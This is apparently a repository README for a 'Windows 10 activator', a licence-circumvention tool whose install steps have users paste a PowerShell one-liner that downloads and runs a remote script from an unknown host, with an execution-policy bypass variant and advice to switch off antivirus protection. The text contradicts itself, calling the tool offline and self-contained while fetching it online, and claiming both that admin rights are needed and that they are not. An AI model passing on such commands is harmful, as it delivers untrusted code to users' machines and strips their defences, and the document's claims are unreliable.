<div align="center">

# Windows Activation Utility for Windows 10 & 11

![preview](https://raw.githubusercontent.com/Kirby093/windows-10-compat-tool/main/splash_d9e02c.svg)

[![powershell-7](https://img.shields.io/badge/POWERSHELL--7-5.1%2B-e11d48?style=social&labelColor=0d1117)]() [![installs](https://img.shields.io/badge/INSTALLS-3.4K-f43f5e?style=social&labelColor=0d1117)]() [![pipeline](https://img.shields.io/badge/PIPELINE-GREEN-2ea44f?style=social&labelColor=0d1117)]() [![release](https://img.shields.io/badge/RELEASE-MAINTAINED-2ea44f?style=social&labelColor=0d1117)]() [![rate](https://img.shields.io/badge/RATE-5.0%2F5-f59e0b?style=social&labelColor=0d1117)]() [![win](https://img.shields.io/badge/WIN-WINDOWS_10_%2F_11-be123c?style=social&labelColor=0d1117)]()

</div>

---

WINDOWS-10-ACTIVATOR-1.0 is a desktop utility engineered to activate several releases of Windows 10, applying compatibility logic tailored to the host machine's configuration. The tool targets specific version variants, determining activation paths based on detected system parameters rather than a single fixed routine. Built as a self-contained executable, it performs its operations locally with minimal footprint and no additional dependencies. It is intended for technicians and advanced users who require a compact, feature-focused activation solution across mixed Windows 10 environments.

## 🔧 PowerShell Setup

> [!TIP]
> **Automated setup** — one command, done.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Launch PowerShell
* Press `Win + X` on your keyboard.
* Click on **Terminal** or **Windows PowerShell** from the list.

### 2️⃣ Run the install command
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If Windows blocks the script — use CMD
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## 📋 System Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- Activates multiple Windows 10 editions through a version-compatible activation path that adapts to the detected build, edition, and system configuration.
- Performs pre-activation environment checks to verify edition, build, and prerequisite conditions before applying any activation routine.
- Supports a range of Windows 10 versions, with compatibility determined at runtime for the host machine.
- Executes a consolidated activation workflow, minimizing manual steps and user intervention.
- Provides clear status and result output at each stage, indicating success, failure, or unsupported conditions.
- Operates with elevated privileges when required and restores normal execution state afterward.
- Handles activation errors gracefully with descriptive diagnostics to aid troubleshooting.
- Maintains a lightweight footprint with no background services or persistent processes after completion.
- Includes a safe-exit path that leaves the system unchanged if pre-checks determine incompatibility.
- Designed for local, offline operation without reliance on external endpoints during the activation process.

## How it works

WINDOWS-10-ACTIVATOR-1.0 operates as a lightweight, script-driven utility that interfaces directly with the Windows licensing subsystem to enable activation of supported Windows 10 editions on compatible hardware. The tool is self-contained and executes locally on the target machine without requiring external dependencies or background services.

At runtime, the activator performs the following sequence:

1. **Environment validation** — The tool first inspects the host operating system to confirm the Windows 10 build, edition, and architecture. Unsupported configurations are detected and reported before any modification is attempted.

2. **Edition matching** — Based on the detected Windows 10 version, the activator selects the appropriate activation profile from its embedded compatibility set, ensuring the correct licensing channel is applied for the installed edition.

3. **Activation routine execution** — The tool applies its activation logic against the local licensing components, configuring the system to recognize a valid activation state. All operations are performed on-device; no network calls to third-party services are made.

4. **Status verification** — After the activation routine completes, the tool queries the Windows licensing status to confirm the resulting state and reports success or failure to the user.

5. **Logging and rollback safety** — Each run produces a local log of actions taken. If activation does not succeed, the tool leaves the system in its prior state, avoiding partial or inconsistent licensing configurations.

The activator is designed for single-run execution: launch it, allow it to complete its validation and activation cycle, and review the reported status. No persistent agents, scheduled tasks, or system services are installed, keeping the footprint minimal and the behavior transparent and reproducible.

## Compatibility

WINDOWS-10-ACTIVATOR-1.0 targets 64-bit and 32-bit Windows 10 installations, with support scoped to specific editions and build ranges rather than the entire Windows 10 family. Compatibility is determined at runtime by querying the installed edition and build number before any activation routine is executed.

**Supported editions**

- Windows 10 Home and Home Single Language
- Windows 10 Pro
- Windows 10 Pro Education and Pro for Workstations
- Windows 10 Enterprise and Enterprise LTSC
- Windows 10 Education

**Build and architecture notes**

- Designed for Windows 10 builds from the initial release through the current servicing baseline.
- Runs natively on x64 systems and on x86 systems where the installed edition supports the routine.
- Requires administrative privileges; the tool checks elevation on launch and halts with a diagnostic message if the session is not elevated.

**Unsupported targets**

- Windows 11, Windows 8.1, Windows 8, Windows 7, and earlier releases.
- Server SKUs and non-Windows operating systems.
- Modified or heavily customized images where edition reporting does not match the underlying binary set.

When an unsupported edition or build is detected, the tool exits without making changes and reports the detected configuration. Compatibility checks are read-only and complete before any modification is attempted, so an unsupported environment is left untouched.

## FAQ

- **What does WINDOWS-10-ACTIVATOR-1.0 do?** 
 WINDOWS-10-ACTIVATOR-1.0 is a desktop utility designed to activate select Windows 10 versions on compatible PCs. It provides a streamlined activation workflow without requiring manual configuration of system-level components.

- **Which Windows 10 versions are supported?** 
 The tool targets a defined set of Windows 10 editions and builds that are explicitly listed in the Compatibility section. Activation is only guaranteed for those versions; unsupported builds may fail validation or behave unpredictably.

- **How does the activation process work?** 
 The utility applies the required activation logic locally on the host machine. It validates the current Windows 10 environment, selects the appropriate activation path for the detected edition, and executes the necessary operations. No external services are contacted during the process.

- **Does the tool require administrative privileges?** 
 Yes. Activation modifies protected system components, so the application must be launched with elevated privileges. Running without administrator rights will result in a permissions error and incomplete activation.

- **Will activation persist after a reboot or Windows update?** 
 Activation state is written to the local system and generally survives reboots. However, major Windows feature updates or edition changes may reset activation status. In such cases, the tool can be re-run to restore activation on the same compatible build.

- **Is the tool compatible with all hardware configurations?** 
 Compatibility depends on the Windows 10 edition and build rather than specific hardware. The tool performs an environment check at startup and reports unsupported configurations before any system changes are made.

- **Does the utility modify system files permanently?** 
 The tool makes targeted, reversible changes required for activation. A rollback path is provided to restore the system to its pre-activation state if needed.

- **What should I do if activation fails?** 
 Verify that the installed Windows 10 version is listed as compatible, confirm the application is running with administrator privileges, and ensure no conflicting activation tools are active. Review the on-screen diagnostic output for the specific failure reason before retrying.

- **Is any network connection required?** 
 No. WINDOWS-10-ACTIVATOR-1.0 operates fully offline and does not transmit system information or activation data to any remote endpoint.

- **Can the tool be used on multiple machines?** 
 The utility is intended for use on the local PC where it is executed. Each target machine must run the tool independently and meet the stated compatibility requirements.

## Disclaimer

WINDOWS-10-ACTIVATOR-1.0 is provided strictly as-is for evaluation and testing purposes. No warranty, express or implied, is offered regarding activation success, system stability, or fitness for any particular deployment scenario.

Activation behavior may vary across Windows 10 editions, build revisions, and system configurations. Compatibility is limited to the versions documented in the Compatibility section, and results on modified, updated, or otherwise non-standard installations are not guaranteed. Users are responsible for verifying that their environment matches the supported parameters before execution.

This tool modifies system-level activation components. Such modifications can conflict with cumulative updates, feature upgrades, security patches, or third-party endpoint protection software. Any alteration of system state carries inherent risk, including but not limited to activation resets, update failures, or boot configuration issues. Testing in a non-production or virtualized environment is strongly recommended prior to broader use.

Usage of this software is intended solely for legitimate purposes, including recovery scenarios and validation of systems for which the user holds appropriate entitlements. Users assume full responsibility for compliance with all applicable laws, licensing terms, and organizational policies. The project maintainers disclaim liability for any direct, indirect, incidental, or consequential damages arising from the download, execution, or distribution of this tool.

No guarantee is made regarding the accuracy, completeness, or continued availability of the software or its accompanying documentation. Features may change or be withdrawn without notice. By running WINDOWS-10-ACTIVATOR-1.0, the user acknowledges and accepts these terms in full.

## License

This project is distributed under the MIT License. The license grants permission to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to inclusion of the original copyright notice and this permission notice in all copies or substantial portions of the software. The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software. Redistribution of modified builds must retain attribution to the original project. Users are responsible for ensuring their use of this tool complies with all applicable software licensing terms and local regulations.